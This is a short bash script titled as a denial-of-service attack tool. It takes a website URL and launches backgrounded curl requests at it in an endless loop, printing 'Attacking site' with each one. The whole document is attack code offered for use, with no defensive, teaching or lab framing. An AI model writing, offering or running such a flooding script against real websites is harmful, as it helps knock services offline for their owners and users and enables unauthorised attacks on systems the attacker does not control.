# DoS Attack Tool in any terminal 

#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <website_url>"
  exit 1
fi

URL=$1

while true; do
  curl -s -o /dev/null "$URL" &
  echo "[*] Attacking site: $URL"
done
